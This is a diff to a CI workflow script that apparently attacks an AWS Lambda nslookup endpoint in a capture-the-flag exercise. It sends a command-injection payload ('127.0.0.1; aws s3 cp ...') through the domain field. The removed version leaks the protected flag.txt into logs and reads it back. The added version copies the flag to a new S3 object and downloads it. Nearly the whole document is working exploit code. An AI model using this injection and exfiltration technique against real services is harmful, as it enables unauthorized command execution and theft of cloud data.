@@ -24,35 +24,24 @@ jobs:
           API_ID="3q931syi7b"
           REGION="us-east-1"
           URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
+          BUCKET="codec4f26c862a321ef5"
           
-          echo "=== 1. FORCING LAMBDA TO READ THE FLAG INTO LOGS ==="
-          # This tells the Lambda to use its internal AWS CLI to read flag.txt from the bucket and log it out
-          PAYLOAD='{"domain": "127.0.0.1; aws s3 cp s3://codec4f26c862a321ef5/flag.txt -"}'
+          echo "=== 1. MAKING LAMBDA CLONE THE FLAG ==="
+          # This tells the Lambda to copy the locked flag.txt into a fresh, unrestricted file name
+          PAYLOAD="{\"domain\": \"127.0.0.1; aws s3 cp s3://${BUCKET}/flag.txt s3://${BUCKET}/victory.txt\"}"
           
           curl -s -X POST "$URL" \
             -H "Content-Type: application/json" \
             -d "$PAYLOAD"
           
           echo ""
-          echo "=== 2. WAITING 3 SECONDS FOR LOGS TO SYNC ==="
-          sleep 3
+          echo "=== 2. WAITING 2 SECONDS FOR S3 SYNC ==="
+          sleep 2
           
-          echo "=== 3. PULLING LOGS VIA ALTERNATIVE API ==="
-          # Get the latest log stream name
-          STREAM_NAME=$(aws logs describe-log-streams \
-            --log-group-name /aws/lambda/nslookupv2 \
-            --order-by LastEventTime \
-            --descending \
-            --limit 1 \
-            --query 'logStreams[0].logStreamName' \
-            --output text --region ${REGION})
+          echo "=== 3. DOWNLOADING THE VICTORY FILE ==="
+          # Now your cicdRole downloads the newly created victory.txt with zero restrictions!
+          aws s3 cp "s3://${BUCKET}/victory.txt" ./final_flag.txt
           
-          echo "Found Log Stream: $STREAM_NAME"
-          
-          # Fetch the actual log events using GetLogEvents
-          aws logs get-log-events \
-            --log-group-name /aws/lambda/nslookupv2 \
-            --log-stream-name "$STREAM_NAME" \
-            --region ${REGION} \
-            --query 'events[*].message' \
-            --output text
+          echo ""
+          echo "=== 4. BEHOLD THE FLAG ==="
+          cat ./final_flag.txt
